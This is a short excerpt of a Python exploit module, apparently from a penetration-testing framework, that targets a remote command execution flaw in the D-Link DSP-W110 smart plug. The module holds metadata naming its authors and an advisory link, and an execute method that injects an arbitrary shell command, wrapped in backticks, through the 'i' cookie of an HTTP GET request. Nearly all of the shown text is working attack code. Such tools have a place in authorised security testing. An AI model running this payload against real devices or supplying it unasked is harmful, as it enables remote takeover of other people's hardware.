...
class Exploit(HTTPClient):
    __info__ = {'name': 'D-Link DSP-W110 RCE', 'description': 'Module exploits D-Link DSP-W110 Remote Command Execution vulnerability which allows executing command on the operating system level.', 'authors': ('Peter Adkins <peter.adkins[at]kernelpicnic.net', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110',), 'devices': ('D-Link DSP-W110 (Rev A) - v1.05b01',)}
    ...
    def execute(self, cmd):
        ...
        payload = '`{}`'.format(cmd)
        cookies = {'i': payload}
        self.http_request(method='GET', path='/', cookies=cookies)
        return ''
